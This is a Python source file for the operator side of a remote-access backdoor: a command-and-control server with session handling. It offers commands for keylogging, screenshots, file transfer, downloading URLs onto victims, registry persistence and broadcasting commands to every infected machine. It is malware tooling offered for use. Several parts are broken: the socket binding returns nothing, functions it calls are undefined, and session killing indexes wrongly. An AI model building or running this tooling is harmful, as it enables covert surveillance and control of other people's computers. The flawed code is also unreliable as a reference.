import socket, json, os, threading
from colour import banner, Colour


def reliable_recv(target):
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_download_file(target, command, file_name):
    f = open(file_name, "rb" if command.startswith("upload") else "wb")
    target.send(f.read() if command.startswith("upload") else target.recv(1024))
    f.close()


def screenshot(target, count):
    directory = "./screenshots"
    if not os.path.exists(directory):
        os.makedirs(directory)
    f = open(f"{directory}/screenshot_{count}.png", "wb")
    target.settimeout(3)
    try:
        chunk = target.recv(10485760)  # 10MB
    except:
        pass
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(10485760)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    count += 1


def server_help_manual():
    print(
        """\n
    quit                                --> Quit Session With The Target
    clear                               --> Clear The Screen
    background                          --> Send Session With Target To Background
    cd *Directory name*                 --> Changes Directory On Target System
    upload *file name*                  --> Upload File To The Target Machine From Working Dir 
    download *file name*                --> Download File From Target Machine
    get *url*                           --> Download File From Specified URL to Target ./
    keylog_start                        --> Start The Keylogger
    keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
    keylog_stop                         --> Stop And Self Destruct Keylogger File
    screenshot                          --> Takes screenshot and sends to server ./screenshots/
    start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
    remove_backdoor                     --> Removes backdoor from target!!!
    
    ===Windows Only===
    persistence *RegName* *filename*    --> Create Persistence In Registry
                                            copies backdoor to ~/AppData/Roaming/filename
                                            example: persistence Backdoor windows32.exe
    check                               --> Check If Has Administrator Privileges
    \n"""
    )


def c2_help_manual():
    print(
        """\n
    ===Command and Control (C2) Manual===
    targets                 --> Prints Active Sessions
    session *session num*   --> Will Connect To Session (background to return)
    clear                   --> Clear Terminal Screen
    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
    kill *session num*      --> Issue 'quit' To Specified Target Session
    sendall *command*       --> Sends The *command* To ALL Active Sessions (sendall notepad)
    \n"""
    )


def target_communication(target, ip):
    count = 0
    while True:
        command = input("* Shell~%s: " % str(ip))
        reliable_send(target, command)
        if command == "quit":
            break
        elif command == "background":
            break
        elif command == "clear":
            os.system("clear")
        elif command[:3] == "cd ":
            pass
        elif command[:6] == "upload":
            upload_file(target, command[7:])
        elif command[:8] == "download":
            download_file(target, command[9:])
        elif command[:10] == "screenshot":
            screenshot(target, count)
            count = count + 1
        elif command == "help":
            server_help_manual()
        else:
            result = reliable_recv(target)
            print(result)


def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            # print(termcolor.colored(str(ip) + ' has connected!', 'green'))
            print(
                Colour().green(str(ip) + " has connected!")
                + "\n[**] Command & Control Center: ",
                end="",
            )
        except:
            pass


if __name__ == "__main__":
    targets, ips, stop_flag = [], [], False
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM).bind(("127.0.0.1", 5555))
    sock.listen(5)
    threading.Thread(target=accept_connections).start()
    print(banner(), "\nRun 'help' command to see the usage manual")
    print(Colour().green("[+] Waiting For The Incoming Connections ..."))

    while True:
        try:
            command = input("[**] Command & Control Center: ")
            if command == "targets":
                [print(f"Session {i} --- {ip}") for i, ip in enumerate(ips)]
            elif command == "clear":
                os.system("clear")
            elif "session" in command:
                try:
                    i = int(command[8:])
                    target_communication(targets[i], ips[i])
                except:
                    print("[-] No Session Under That ID Number")
            elif command == "exit":
                [reliable_send(t, "quit") and t.close() for t in targets]
                sock.close()
                stop_flag = True
                threading.Thread(target=t1.join).start()
                break
            elif "kill" in command:
                i = int(command[5:])
                reliable_send(targets[i], "quit")
                targets.pop(i), ips.pop(i), targets[i].close()
            elif "sendall" in command:
                [reliable_send(t, command) for t in targets]
            elif command == "help":
                c2_help_manual()
            else:
                print(Colour().red("[!!] Command Doesnt Exist"))
        except (KeyboardInterrupt, SystemExit):
            if input("\nDo you want to exit? yes/no: ") == "yes":
                sock.close()
                print(Colour().yellow("\n[-] C2 Socket Closed! Bye!!"))
                break
        except ValueError as e:
            print(Colour().red(f"[!!] ValueError: {e}"))
            continue
